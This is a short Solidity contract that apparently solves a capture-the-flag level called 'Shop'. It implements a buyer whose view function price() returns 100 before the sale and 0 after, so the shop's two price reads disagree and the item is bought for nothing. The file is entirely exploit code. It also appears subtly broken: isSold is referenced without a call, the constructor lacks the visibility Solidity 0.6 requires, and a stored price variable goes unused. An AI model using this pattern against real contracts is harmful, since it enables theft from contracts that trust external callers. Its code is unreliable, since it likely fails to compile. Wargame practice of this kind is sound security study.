// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import './Shop.sol';

contract ShopSolved is Buyer {

  using SafeMath for uint;
  uint _price;
  Shop public shop;

  constructor (address _shop) {
    shop = Shop(_shop);
    _price = shop.price().add(1);
  }

  function price() external view override returns (uint) {
    // view can read changing state in other contract 
    if (!shop.isSold) {
      return 100;
    } else {
      return 0;
    }
  }

  function buyItem() public {
    shop.buy();
  }
}